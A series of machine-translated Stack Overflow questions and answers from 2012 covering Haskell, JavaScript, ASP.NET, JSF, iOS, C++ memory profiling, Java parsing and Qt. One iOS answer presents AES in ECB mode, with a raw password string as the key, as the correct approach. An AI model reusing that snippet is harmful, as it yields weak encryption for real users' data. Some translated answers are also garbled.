> ID：13490701
> 
> 赞同：0
> 
> 时间：2012-11-21T10:02:17.837
> 
> 标签：haskell

我有一个这个typedef的对象。

```
type ListDA = (State, [((State, Char), State)], [State]) 
```

对于函数，我需要第二个参数，但我现在不知道如何得到它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T10:06:30.600

您可以编写一个辅助函数：

```
snd3 :: (a, b, c) -> b
snd3 (_, b, _) = b 
```

或者您可以直接在函数参数中进行模式匹配，例如通过替换

```
yourFunction object = ... 
```

和

```
yourFunction object @ (_, secondArgument, _) = ... 
```

您最好定义一个单独的类型：

```
data ListDA = ListDA {firstField  :: State,
                      secondField :: [((State, Char), State)],
                      thirdField  :: [State]} 
```

此方法为您定义访问器函数。

# javascript - 每次缺少函数参数时检查未定义

> ID：13490705
> 
> 赞同：0
> 
> 时间：2012-11-21T10:02:33.833
> 
> 标签：javascript, undefined

我正在研究一个 js 代码片段来制作一个可以用对象文字调用的函数。

问题区域：如果我不需要跟踪产品价值，则检查未定义。但是，如果对象文字中不存在每个值，我是否真的需要检查每个值。下面是代码。

```
trackProduct = function (args) {

      if(args.label == undefined) {
        value.push([args.category, args.action, args.value]);
      } else if(args.value == undefined){
        value.push([args.category, args.action, args.label]);
      } else {
        value.push([args.category, args.action, args.label, args.value]);
      }
}; 
```

通过下面的对象文字调用此函数。我没有传递 value 参数。我们是否需要检查所有三个参数的未定义？

```
trackProduct({
    category: elemcategory,
    action: elemaction,
    label: elemlabel
}); 
```

有关如何改进此代码的任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:34:15.983

您可以尝试以下方法：

```
trackProduct = function (args) {
    var tempArray = [];

    args.category && tempArray.push(args.category);
    args.action && tempArray.push(args.action);
    args.label && tempArray.push(args.label);
    args.value && tempArray.push(args.value);

    value.push(tempArray); // [["elemcategory", "elemaction", "elemlabel"]]
}; 
```

同样正如@jisi 指出的那样，如果其中任何一个可以保存虚假值，例如 0、'' 等，那么这个简单的条件将不成立。在这种情况下，`typeof(args.category) === 'undefined'`应该使用。

除非您对可重复性感到满意，并且确定要阅读代码的人会理解这一点，否则我什至不建议这样做。

上面的示例说明了处理未定义的值。

* * *

迭代对象可以通过[for in](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Statements/for...in)来完成：

```
var tempArray = [];
for (var prop in args) tempArray.push(args[prop]);
value.push(tempArray); 
```

# c# - asp.net 自定义成员资格提供程序对 GetUser() 的多次调用使应用程序变慢

> ID：13490708
> 
> 赞同：0
> 
> 时间：2012-11-21T10:02:51.510
> 
> 标签：c#, asp.net, asp.net-membership, telerik-open-access

我正在开发一个门户系统来共享信息和文档等。每个用户都可以有多个配置文件。每个配置文件因此可以具有不同的角色和权限。现在一切正常，但我对 MembershipProvider 和 MembershipUser 有疑问。

我将自定义 MembershipProvider 和 MembershipUser 与 OpenAccess ORM 结合使用。

我非常依赖`(CustomMembershipUser)Membership.GetUser()`. 例如，我构建了一个用户菜单，他们可以在其中看到他们登录的用户以及他们可以从哪些配置文件中选择。

要构建此菜单并收集当前配置文件的组、角色和权限，代码中有很多`Membership.GetUser()`来自不同位置的调用。我首先缓存了用户并根据 ProviderUserKey 返回了这个，但我被告知这是不安全的。所以我删除了缓存，但速度要快得多。是否有替代的最佳实践？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:15:45.823

对于您的情况，没有 100% 的解决方案，要么你缓存了你的结果，要么你每次都计算它。妥协是非常小心地配置缓存策略，如果缓存会导致您的应用程序风险。

Afaik，只有在您必须立即应用更改的情况下，缓存才会在极少数情况下导致风险。考虑使用一些高级缓存策略，例如[缓存依赖](http://msdn.microsoft.com/en-us/library/system.web.caching.cachedependency.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:58:17.797

Session 是基于您的描述的适当解决方案。它足够安全。HttpContext.Items["MembershipUser"] 仅将用户信息保留在一个 http 请求中，而会话保留信息直到会话到期。

缓存，但是是每个应用程序而不是每个用户

# jsf - 处理 Session 过期后 JSF 页面变空白

> ID：13490712
> 
> 赞同：2
> 
> 时间：2012-11-21T10:02:59.047
> 
> 标签：jsf

我有 JSF 页面，其中包含指向其他 JSF 页面的链接。当我单击链接并且会话已经过期时，控制转到登录页面。我将使用用户名密码登录，然后再次来到我点击链接的同一页面。现在我将单击链接，将显示一个空白页面，如果我按 F5 刷新页面，则会加载预期的页面。

而且我还检查了我的 Jboss 服务器上的控制台，没有出现 View Expired 异常。

所以我有点困惑我用哪种方式来处理这个以避免显示空白页。

请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:41:03.623

如果您通过 ajax 执行链接导航，并且登录后返回的页面是从浏览器缓存提供的（因此包含具有过期视图状态标识符的表单），则可能会发生这种情况。您需要告诉浏览器不要缓存受限页面。您可以使用以下过滤器实现此目的：

```
@WebFilter(servletNames={"Faces Servlet"})
public class NoCacheFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse res = (HttpServletResponse) response;

        if (!req.getRequestURI().startsWith(req.getContextPath() + ResourceHandler.RESOURCE_IDENTIFIER)) { // Skip JSF resources (CSS/JS/Images/etc)
            res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate"); // HTTP 1.1.
            res.setHeader("Pragma", "no-cache"); // HTTP 1.0.
            res.setDateHeader("Expires", 0); // Proxies.
        }

        chain.doFilter(request, response);
    }

    // ...
} 
```

请注意，此问题因此也表明您正在使用（ajax）命令链接进行页面到页面导航。这是一个不好的做法。这些链接不是 SEO 友好的，也不是可收藏的。命令链接应仅用于表单提交。使用普通链接进行页面到页面导航。另请参阅[何时应该使用 h:outputLink 而不是 h:commandLink？](https://stackoverflow.com/questions/4317684/when-should-i-use-houtputlink-instead-of-hcommandlink)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T09:03:24.713

@BaluSC：感谢您的回复。

尽可能使用 h:outputLink。
而且我还通过 web.xml 中的标记处理了 ViewExpiredException。

```
<error-page>
    <exception-type>java.lang.Exception</exception-type>
    <location>/ErrorHandler</location>
  </error-page>

<servlet>
    <servlet-name>ErrorHandler</servlet-name>
    <servlet-class>com.common.beans.ErrorHandler</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>ErrorHandler</servlet-name>
    <url-pattern>/ErrorHandler</url-pattern>
  </servlet-mapping> 
```

使用处理此异常并重定向到同一页面并正确加载页面的 servlet。Servlet 的 doGet 方法检查 ViewExpiredException。

```
public void doGet(HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException
 {

      if (request.getAttribute("javax.servlet.error.exception") != null
         && request.getAttribute("javax.servlet.error.exception")
            .toString().contains("ViewExpiredException"))
      {

            String[] attributes =
               request.getAttribute("javax.servlet.error.request_uri")
                  .toString().split("/");
            StringBuilder redirectViewId = new StringBuilder("");
            for (int i = 2; i < attributes.length; i++)
            {
               redirectViewId.append("/").append(attributes[i]);
            }
            response.sendRedirect(FacesUtils.getFullRequestUrl(request)
               + redirectViewId);
         }
} 
```

# iphone - 在 iTunes 描述中插入表情符号

> ID：13490714
> 
> 赞同：1
> 
> 时间：2012-11-21T10:03:00.970
> 
> 标签：iphone, app-store-connect, emoji

我是一名 iPhone 开发人员，我想知道如何将表情符号插入到应用程序的 iTunes 描述中。

有时，当您在 AppStore 中阅读应用程序的描述时，您会看到星星、物体、狗等……但是当您编写它们时，您会通过浏览器进入 iTunesconnect。

如何将表情符号放入描述中？

有人能帮助我吗？

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-05-18T15:24:49.387

也许是最好/更简单的解决方案：

在写下您的描述时，在文本框中按 Control + Command + Space。这将显示 mac 表情符号键盘。只需选择您喜欢的和 MAGIC !!!

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:07:53.650

使用 iPad 或 iPhone 编写描述，包括表情符号...通过电子邮件发送给自己，将电子邮件正文复制/粘贴到 iTunesConnect 上的应用描述中

# ios - iOS AES错误的实现？

> ID：13490716
> 
> 赞同：0
> 
> 时间：2012-11-21T10:03:16.873
> 
> 标签：ios, cocoa-touch, aes

我的 AES 方法（下面的代码）仅适用于自加密数据。我不知道哪里出错了。你能建议我一些框架或更好的实现吗？

```
- (NSData *)aesOperation:(CCOperation)op OnData:(NSData *)data key:(NSString*)inKey {
    NSData *outData = nil;
    int bufferSize = 6000000;
    NSLog(@"AES InData: %@",data);
    if (inKey == NULL) {
        NSLog(@"A klucz to chcesz wyczarować? Podaj klucz do zaszyfrowanego pliku");
        return NULL;
    }

    const void *key = inKey ;
    const void *dataIn = data.bytes;
    size_t dataInLength = data.length;
    // Data out parameters
    size_t outMoved = 0;

    unsigned char outBuffer[bufferSize];
    memset(outBuffer, 0, bufferSize);
    CCCryptorStatus status = -1;

    status = CCCrypt(op, kCCAlgorithmAES128, kCCOptionECBMode, key, kCCKeySizeAES128, NULL,
                     dataIn, dataInLength, &outBuffer, bufferSize, &outMoved);

    if(status == kCCSuccess) {
        outData = [NSData dataWithBytes:outBuffer length:outMoved];
    } else if(status == kCCBufferTooSmall) {

        size_t newsSize = outMoved;
        void *dynOutBuffer = malloc(newsSize);
        memset(dynOutBuffer, 0, newsSize);
        outMoved = 0;

        status = CCCrypt(op,kCCAlgorithmAES128,kCCOptionECBMode,key,kCCKeySizeAES128,NULL,dataIn, dataInLength, &outBuffer, bufferSize, &outMoved);

        if(status == kCCSuccess) {
            outData = [NSData dataWithBytes:outBuffer length:outMoved];
        }
    }
    return outData;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:03:16.873

我找到了使用适合所有人的 AES 密码/解密器的正确方法。

```
- (NSData *)initCipherData:(NSData *)data key:(NSString*)key{
    return [self aesOperation:kCCEncrypt OnData:data key:key];
}

- (NSData *)initDecipherData:(NSData *)data key:(NSString*)key{
    return [self aesOperation:kCCDecrypt OnData:data key:key];
}

- (NSData *)aesOperation:(CCOperation)op 
                  OnData:(NSData *)data 
                     key:(NSString*)inKey {

    const char * key = [inKey UTF8String];
    NSUInteger dataLength = [data length];
    uint8_t unencryptedData[dataLength + kCCKeySizeAES128];
    size_t unencryptedLength;

    CCCrypt(op, 
            kCCAlgorithmAES128, 
            kCCOptionECBMode, 
            key, 
            kCCKeySizeAES128, 
            NULL, 
            [data bytes], 
            dataLength, 
            unencryptedData, 
            dataLength, 
            &unencryptedLength);
    return [NSData dataWithBytes:unencryptedData length:unencryptedLength];
} 
```

# c++ - 跟踪 C++ 中的内存使用情况并评估内存消耗

> ID：13490718
> 
> 赞同：19
> 
> 时间：2012-11-21T10:03:20.467
> 
> 标签：c++, memory-management, memory-leaks

我的代码遇到了以下问题：我使用 Valgrind 和 gperftools 来执行堆检查和堆分析，看看我是否释放了我分配的所有内存。这些工具的输出看起来不错，似乎我并没有失去记忆。但是，当我查看`top`并且我很困惑的输出时，`ps`因为这基本上不代表我使用 valgrind 和 gperftools 观察到的内容。

以下是数字：

*   热门报告：**RES 150M**
*   Valgrind (Massif) 报告：**23M**峰值使用量
*   gperftools Heap Profiler 报告：**22.7M**峰值使用量

我现在的问题是，差异来自哪里？我也尝试跟踪 Valgrind 中的堆栈使用情况，但没有任何成功。

更多细节：

*   该过程基本上是通过C api将数据从mysql加载到内存存储中
*   在加载完成后不久执行泄漏检查并中断，显示最终丢失 144 个字节，并且 10M 可达，这符合当前分配的数量
*   该库不执行复杂的 IPC，它启动了几个线程但只有一个线程正在执行工作
*   它不加载其他复杂的系统库
*   /proc/pid/smaps 中的 PSS 大小对应于 TOP 和 ps 中的 RES 大小

你有什么想法，报告的内存消耗的差异来自哪里？如何验证我的程序是否正确运行？您对我如何进一步调查此问题有任何想法吗？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-22T12:29:17.157

最后我能够解决这个问题，并很乐意分享我的发现。一般来说，从我的角度来看，评估程序内存消耗的最佳工具是 Valgrind 的[Massif](http://valgrind.org/docs/manual/ms-manual.html)工具。它允许您分析堆消耗并为您提供详细分析。

要分析您现在运行的应用程序的堆`valgrind --tool=massif prog`，这将使您能够基本访问有关典型内存分配功能的所有信息，比如`malloc`和朋友。但是，为了更深入地挖掘，我激活了该选项，该选项`--pages-as-heap=yes`甚至会报告有关底层系统调用的信息。这里举个例子是我的分析会话中的一些东西：

```
 67  1,284,382,720      978,575,360      978,575,360             0            0
100.00% (978,575,360B) (page allocation syscalls) mmap/mremap/brk, --alloc-fns, etc.
->87.28% (854,118,400B) 0x8282419: mmap (syscall-template.S:82)
| ->84.80% (829,849,600B) 0x821DF7D: _int_malloc (malloc.c:3226)
| | ->84.36% (825,507,840B) 0x821E49F: _int_memalign (malloc.c:5492)
| | | ->84.36% (825,507,840B) 0x8220591: memalign (malloc.c:3880)
| | |   ->84.36% (825,507,840B) 0x82217A7: posix_memalign (malloc.c:6315)
| | |     ->83.37% (815,792,128B) 0x4C74F9B: std::_Rb_tree_node<std::pair<std::string const, unsigned int> >* std::_Rb_tree<std::string, std::pair<std::string const, unsigned int>, std::_Select1st<std::pair<std::string const, unsigned int> >, std::less<std::string>, StrategizedAllocator<std::pair<std::string const, unsigned int>, MemalignStrategy<4096> > >::_M_create_node<std::pair<std::string, unsigned int> >(std::pair<std::string, unsigned int>&&) (MemalignStrategy.h:13)
| | |     | ->83.37% (815,792,128B) 0x4C7529F: OrderIndifferentDictionary<std::string, MemalignStrategy<4096>, StrategizedAllocator>::addValue(std::string) (stl_tree.h:961)
| | |     |   ->83.37% (815,792,128B) 0x5458DC9: var_to_string(char***, unsigned long, unsigned long, AbstractTable*) (AbstractTable.h:341)
| | |     |     ->83.37% (815,792,128B) 0x545A466: MySQLInput::load(std::shared_ptr<AbstractTable>, std::vector<std::vector<ColumnMetadata*, std::allocator<ColumnMetadata*> >*, std::allocator<std::vector<ColumnMetadata*, std::allocator<ColumnMetadata*> >*> > const*, Loader::params const&) (MySQLLoader.cpp:161)
| | |     |       ->83.37% (815,792,128B) 0x54628F2: Loader::load(Loader::params const&) (Loader.cpp:133)
| | |     |         ->83.37% (815,792,128B) 0x4F6B487: MySQLTableLoad::executePlanOperation() (MySQLTableLoad.cpp:60)
| | |     |           ->83.37% (815,792,128B) 0x4F8F8F1: _PlanOperation::execute_throws() (PlanOperation.cpp:221)
| | |     |             ->83.37% (815,792,128B) 0x4F92B08: _PlanOperation::execute() (PlanOperation.cpp:262)
| | |     |               ->83.37% (815,792,128B) 0x4F92F00: _PlanOperation::operator()() (PlanOperation.cpp:204)
| | |     |                 ->83.37% (815,792,128B) 0x656F9B0: TaskQueue::executeTask() (TaskQueue.cpp:88)
| | |     |                   ->83.37% (815,792,128B) 0x7A70AD6: ??? (in /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.16)
| | |     |                     ->83.37% (815,792,128B) 0x6BAEEFA: start_thread (pthread_create.c:304)
| | |     |                       ->83.37% (815,792,128B) 0x8285F4B: clone (clone.S:112)
| | |     |                         
| | |     ->00.99% (9,715,712B) in 1+ places, all below ms_print's threshold (01.00%)
| | |     
| | ->00.44% (4,341,760B) in 1+ places, all below ms_print's threshold (01.00%) 
```

如您所见，我的内存分配中约 85% 来自单个分支，现在的问题是，如果原始堆分析显示正常消耗，为什么内存消耗如此之高。如果你看一下这个例子，你就会明白为什么。对于分配，我过去常常`posix_memalign`确保分配发生在有用的边界上。然后这个分配器从外部类传递给内部成员变量（在这种情况下是一个映射），以使用分配器进行堆分配。但是，在我的情况下，我选择的边界太大 - 4096。这意味着，您将分配 4b 使用`posix_memalign`但是系统会为您分配一个完整的页面以正确对齐它。如果您现在分配许多小值，您最终会得到大量未使用的内存。正常的堆分析工具不会报告此内存，因为您只分配了该内存的一小部分，但系统分配例程将分配更多并隐藏其余部分。

为了解决这个问题，我切换到更小的边界，从而可以大大减少内存开销。

作为我在 Massif & Co. 工作时间的总结，我只能推荐使用此工具进行深入分析，因为它可以让您很好地了解正在发生的事情并允许轻松跟踪错误。对于使用`posix_memalign`情况不同。在某些情况下确实有必要，但是，在大多数情况下，使用普通的`malloc`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T19:57:40.417

根据[这篇](http://virtualthreads.blogspot.de/2006/02/understanding-memory-usage-on-linux.html)文章 ps/top 报告如果您的程序是唯一运行的程序，它会使用多少内存。假设您的程序例如使用了一堆共享库，例如 STL，它们已经加载到内存中，那么由于程序的执行而分配的实际内存量与如果它分配的内存量之间存在差距唯一的过程。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:11:28.430

默认情况下，Massif 只报告堆大小。TOP 报告内存中的实际大小，包括程序代码本身使用的大小以及堆栈大小。

尝试为 Massif 提供该`--stacks=yes`选项，告诉它报告总内存使用情况，包括堆栈空间，看看这是否会改变画面？

# ios - UITableView 使我的应用程序崩溃

> ID：13490724
> 
> 赞同：0
> 
> 时间：2012-11-21T10:03:42.647
> 
> 标签：ios, uitableview

它在线上崩溃

```
UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier ]; 
```

这是我的数据源的代码（默认情况下，将包含视图控制器作为数据源）

```
 - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    // Return the number of sections.
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{

    return 2;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"albumCell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier ];

    cell.textLabel.text = @"display cell";
    return cell;
} 
```

和单元格打印屏幕的链接 [http://img526.imageshack.us/img526/495/screenshot20121121at115.png](http://img526.imageshack.us/img526/495/screenshot20121121at115.png)

我在 uitables 上做了苹果示例应用程序，它可以工作，我找不到我在那里所做的和我在这里所做的之间的区别。试了一百次调试。有人可以帮我找出我的代码的问题吗？

编辑：删除了我注释掉的代码

编辑2：我删除了视图并重新放置它并且它起作用了，我猜我在首选项中搞砸了一些东西

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:09:29.970

```
]objectForKey:@"name"]; 
```

这条线有什么用？你确定你粘贴了整个完整的代码吗？

还要检查你的 .xib 文件，在你的表格视图中你应该输入一个 CellIdentifier 字段值

# delphi - 如何在 DevExpress QuantumGrid (VCL) 中的 onCustomDrawCell 事件中获取列索引

> ID：13490728
> 
> 赞同：4
> 
> 时间：2012-11-21T10:03:54.770
> 
> 标签：delphi, devexpress, vcl

在我的应用程序中，我需要共同绘制一些不同颜色的网格列（不完全是行）。如何从 TcxGridTableDataCellViewInfo 变量中获取当前的列 ID？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T10:24:32.200

您可以使用 AViewInfo.Item.Index。

或者，您可以为每一列分配一个不同的 OnCustomDrawCell 处理程序，而不是为视图分配一个处理程序。那么就不需要区分列了。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-21T12:14:23.250

例子：

```
procedure TFrmBestellingen.grdRequestDBTableCustomDrawCell(
  Sender: TcxCustomGridTableView; ACanvas: TcxCanvas;AViewInfo:   
  TcxGridTableDataCellViewInfo; var ADone: Boolean);
var
  varValue: Variant;
begin
  inherited;
  // Which column must i paint: Paint on column <TcxGridDbColumn>
  if (AViewInfo.Item.Index = <TcxGridDbColumn>.Index) then
  begin
    // Get Value to compare if it is 100
    varValue:=AViewInfo.GridRecord.Values[<TcxGridDbColumn>.Index];
    if (Not VarIsNull(varValue)) and
       (varValue=100) then
    begin
      ACanvas.Font.Style:= [fsBold];
      ACanvas.Brush.Color:= clSilver;
    end;
  end;
end; 
```

# java - 超过一行在java中读取文件

> ID：13490729
> 
> 赞同：0
> 
> 时间：2012-11-21T10:03:56.673
> 
> 标签：java, file, bufferedreader

嗨，

我在逐行读取文件时遇到逻辑问题。我知道你可以用 来做到这一点`BufferedReader`，但有时我有写在更多行中的“值”，这很重要。

我正在阅读的文件示例：

```
 <#FIELD NAME = DESC> Some text that goes

        over multiple lines

        which is needed</#FIELD>

    <#FIELD NAME = TEMP> some values are just a single line</#FIELD> 
```

我需要解析字段名称，如上面的 TEMP 或 DESC，然后提取这些括号之间的值`<#FIELD NAME =DESC>important values </#FIELD>`。但是我不确定如何“识别”一个条目具有多行值或单值行，然后在使用 BufferedReader 时将其保存到变量中。

我真的很感激任何提示或例子来引导我走向正确的方向！

因为逐行阅读它并没有帮助我取得进步......我不会发布整个代码，因为我认为有一种更简单的阅读方式，你会了解我到目前为止所做的事情小片段。

```
if (line.contains("<#FIELD NAME = AUTOR>"))
{
    String autor = line.substring(line.indexOf(">") + 1, line.indexOf("</#"));
    metaData.setAutor(autor.trim());
}
else if (line.contains("<#FIELD NAME = DOKUMENTNR>"))
{
    String dokumentnr = line.substring(line.indexOf(">") + 1, line.indexOf("</#"));
    metaData.setDoukumentnr(dokumentnr.trim());
    ... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:12:45.960

```
while((line=reader.readLine()) != null){
    if(isDescOrTemp(line)){
        if(line.endsWith("</#FIELD>"){
           //one line field
        } else
        while(!line.endsWith("</#FIELD>"){
            //read more lines
            line=reader.readLine();
            //store line somewhere
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:19:47.263

据我了解，如果您没有分层数据（如树），则意味着您有一个列表，因此您正在寻找一种拆分它的方法。通常你应该编写一个干净的解析器，但如果不是这样，你可以尝试破解你的方式。

```
String s = "<#FIELD NAME = DESC> Some text that goes\nover multiple lines\nwhich is needed</#FIELD>\n<#FIELD NAME = TEMP> some values are just a single line</#FIELD>";
String[] fs = s.split("<#FIELD NAME = ");
for (String f : fs) {
    System.out.println(f);
} 
```

生产

```
DESC> Some text that goes
over multiple lines
which is needed</#FIELD>

TEMP> some values are just a single line</#FIELD> 
```

`</#FIELD>`在此之后，您需要通过删除末尾的并读取开头的键来清理结果字符串。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:21:20.677

尝试类似的东西

```
public string ReadField(BufferedReader reader) 
{
    string line = reader.readLine();
    while (line.indexOf("</#FIELD>") == -1)
    {
        line += reader.readLine(); // This does not preserve line breaks
    }

    return line;
} 
```

在原始代码中，类似

```
string line = ReadField(myReader); // This reads up to the next field

if(line.contains("<#FIELD NAME = AUTOR>")){
   String autor = line.substring(line.indexOf(">")+1,line.indexOf("</#"));
   metaData.setAutor(autor.trim());
} else if(line.contains("<#FIELD NAME = DOKUMENTNR>")) {
   String dokumentnr = line.substring(line.indexOf(">")+1,line.indexOf("</#"));
   metaData.setDoukumentnr(dokumentnr.trim());
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:18:45.033

您可以遵循如下伪代码：

```
While(!EOF)
{
    string line = readLine();
    while( !EOF && ! line.contains("</#FIELD>"))
    {
        line += readLine();
    }
    // Here you get a line with matching `begin` and `end`

    // ... do operations as needed

    // reset line
    line = "";
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T10:26:13.433

我的版本：

```
 Pattern p = Pattern.compile("<#FIELD.+</#FIELD>", Pattern.DOTALL);
    Scanner s = new Scanner(new File("test.txt"));
    for(;;) {
        String field = s.findWithinHorizon(p, 0);
        if (field == null) {
            break;
        }
        // here you got a full #FIELD element, parse it
        System.out.println(field);
    } 
```

# google-maps - 谷歌地图 v3 标记在今天放大地图时消失

> ID：13490734
> 
> 赞同：6
> 
> 时间：2012-11-21T10:04:05.827
> 
> 标签：google-maps, google-maps-api-3, google-maps-markers

我正在运行一个谷歌地图 v3 网站，今天大于 55 的标记在放大时消失，在缩小时重新出现。这些标记直到今天都显示得很好，也许谷歌改变了一些东西？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-06-03T14:15:32.613

我解决了这个问题

```
map.panTo(defaultMarker.getPosition()); 
```

然后 fitBounds 到所有标记...

唯一丑陋的想法是地图正在从标记放大到全部，这看起来不太好......

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T18:04:39.333

它似乎是不再接受负值的锚。当我更改为正值时，标记会显示在所有缩放级别。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T15:41:22.190

我同意亨克莫塔。我的自定义标记也开始在缩放更改时消失。“锚点”值在 Y 方向上稍大一些，以使标记稍微向北偏移“位置”。将值更改为在图标大小范围内解决了该问题。它运行了好几个星期，所以 API 中一定发生了一些变化。感谢您发布您的解决方案，因为这很难追踪。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-18T09:11:19.247

也许这是一个 Google api 错误，我发现[问题 167 - 使用 Marker Clusterer (Plus) 时移动的标记消失](http://code.google.com/p/google-maps-utility-library-v3/issues/detail?id=167&colspec=ID%20Type%20Status%20Priority%20Fixed%20Owner%20Summary%20Stars)可能对您有帮助。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-05-06T10:21:55.863

它对我也一样（我使用自定义标记）。我将自定义标记附加到的窗格从`floatPane`更改为`overlayMouseTarget`。这似乎是选择您希望标记在哪个窗格上存在的次要影响：

```
var panes = this.getPanes();
panes.overlayMouseTarget.appendChild(div); 
```

从这个例子：[https ://developers.google.com/maps/documentation/javascript/customoverlays](https://developers.google.com/maps/documentation/javascript/customoverlays)

# node.js - flickr 发布图片 400 错误请求

> ID：13490737
> 
> 赞同：0
> 
> 时间：2012-11-21T10:04:18.093
> 
> 标签：node.js, oauth, flickr, image-uploading

[nodejs应用程序的要点](https://gist.github.com/4124038)

我正在尝试使用[api](http://www.flickr.com/services/api/upload.api.html)将图片上传到 flickr 。它返回**400 bad request**。我已经创建了测试上传服务器。它返回：

```
{ photo: 
  { size: 30792,
    path: '/tmp/f877969414d950e1089bd1c75f8e5bcf.jpg',
    name: 'picture.jpg',
    type: 'image/jpeg',
    ...
}
{ title: 'test photo' } 
```

要求和图片**有效**。我应该使用什么街头魔术来修复 flickr 的服务器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T12:21:46.860

根据规范，Flickr 的上传不支持 oauth。解决方法位于 flickraw ruby​​ 库中

# jquery - 使用 MVC 切换开关

> ID：13490742
> 
> 赞同：1
> 
> 时间：2012-11-21T10:04:36.263
> 
> 标签：jquery, asp.net-mvc, web-applications

我有一个带有表格的视图，每一行都有一个“+”号，当我单击“+”时，它将显示该行的详细信息。现在，我尝试在单击后将此“+”切换为“-”，当我单击“-”时，它将隐藏该行的详细信息，我对此感到困惑。以下是我的看法

```
@Html.Grid(Model.Nodes).Sort(sortOptions).Columns(x=>
    {            
        x.For(c => string.Format("<a class='expander' style='color:black;text-decoration:none;' href='showDetail'>" + "{0}" + "</a>", (c.ChildrenCount > 0 && c.EntityType == "TextNode") ? "+" : "")).DoNotEncode();       
    }).Attributes(Class => "DetailTable").Empty("No data.")

<script type="text/javascript">

$(document).ready(function () {

    $(".expander").click(function () {

        //implementation here

        });

        return false;
    });
});
</script> 
```

任何帮助表示赞赏！谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T13:24:43.087

我解决了这个问题如下：

*   为 onclick 事件创建了一个 toggleState 函数

*   $(文档).on

    功能切换状态（项目）{

    ```
    if (item.className == "expander") {
        item.className = "expanderOff";
    } else {
        item.className = "expander";
    } 
    ```

    }

    $(document).on("click", ".expander", function () {

    });

    $(document).on("click", ".expanderOff", function () {

    });

它已经完成了。:)

# android - GCM 通知不会显示在通知栏中。安卓

> ID：13490762
> 
> 赞同：0
> 
> 时间：2012-11-21T10:05:59.060
> 
> 标签：android, google-cloud-messaging

我已经在我的手机和eclipse模拟器上测试了我的应用程序（针对google api level 16），但是即将到来的通知只会显示在真实手机的通知栏中，而不是模拟器中。有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:12:08.670

你能检查一下你`regID`在模拟器上工作时能得到一个吗？

```
GCMRegistrar.checkDevice(this);
GCMRegistrar.checkManifest(this);

final String regId = GCMRegistrar.getRegistrationId(this);
if (regId.equals("")) {
  GCMRegistrar.register(this, SENDER_ID);
} else {
  Log.v(TAG, "Already registered");
} 
```

# qt - qextserialport 正在放

> ID：13490766
> 
> 赞同：0
> 
> 时间：2012-11-21T10:06:12.657
> 
> 标签：qt, qextserialport

我正在使用 QExtSerialPort 读取 USB 设备，但在读取通过串行端口发送的数据时遇到问题。数据以 100 到 1000Hz 的速率发送，有时数据会粘在一起。例如，如果数据的大小为 18 字节，大多数情况下它被读取为 18 字节，但有时它读取 36 或 54 字节等。当我让我的电脑做其他事情时，这尤其会发生。我使用的代码如下：

```
QextSerailPort port = new QextSerialPort("COM11")
QByteArray data;

connect(port, SIGNAL(readyRead()),this, SLOT(DataAvailable()));

void MainWindow::DataAvailable()
{
    while(!(port->bytesAvailable()));
    data = port->readAll();

    qDebug() << data.toHex();
} 
```

有人有解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:12:34.493

串行端口，如 TCP 链接，是字节流。您不能传输消息、字符串、结构或任何大于一个字节的内容。

您必须有一个协议，可以从字节流中解析出消息/任何内容。没有其他办法。

# android - IllegalStateException: SQLite cursor already closed

> ID：13490777
> 
> 赞同：1
> 
> 时间：2012-11-21T10:06:36.453
> 
> 标签：android, sqlite, cursor

Below I am posting the logcat details. Please tell me How to resolve that.

```
11-21 14:49:33.604: E/AndroidRuntime(1721): FATAL EXCEPTION: main
